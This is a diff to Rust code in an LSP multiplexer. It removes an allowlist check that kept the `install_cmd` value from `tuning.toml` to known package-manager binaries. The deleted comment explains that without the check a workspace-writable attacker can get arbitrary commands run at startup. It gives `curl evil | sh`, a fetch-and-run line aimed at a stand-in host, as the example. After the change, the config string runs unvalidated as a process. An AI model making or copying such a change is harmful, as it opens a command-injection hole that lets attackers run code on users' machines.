@@ -1113,23 +1113,6 @@ impl LspMultiplexer {
             parts.join(" ")
         );
 
-        let parts: Vec<&str> = install_cmd.split_whitespace().collect();
-        // Allowlist the binary: `install_cmd` ultimately comes from
-        // `tuning.toml`, which a workspace-writable attacker can plant.
-        // Without this check, an attacker can run arbitrary commands at
-        // server startup by setting `install_cmd = "curl evil | sh"` or
-        // pointing it at a binary in a writable directory. Reject any
-        // binary that isn't on the curated list of package managers.
-        if !LSP_INSTALL_BINARIES.contains(&parts[0]) {
-            return Err(LainError::Lsp(format!(
-                "Refusing to run install command '{}': binary '{}' is not on the LSP install allowlist \
-                 ({:?}). Add it to LSP_INSTALL_BINARIES in src/server/lsp.rs if the LSP \
-                 genuinely needs it.",
-                install_cmd,
-                parts[0],
-                LSP_INSTALL_BINARIES
-            )));
-        }
         let mut cmd = tokio::process::Command::new(parts[0]);
         if parts.len() > 1 {
             cmd.args(&parts[1..]);
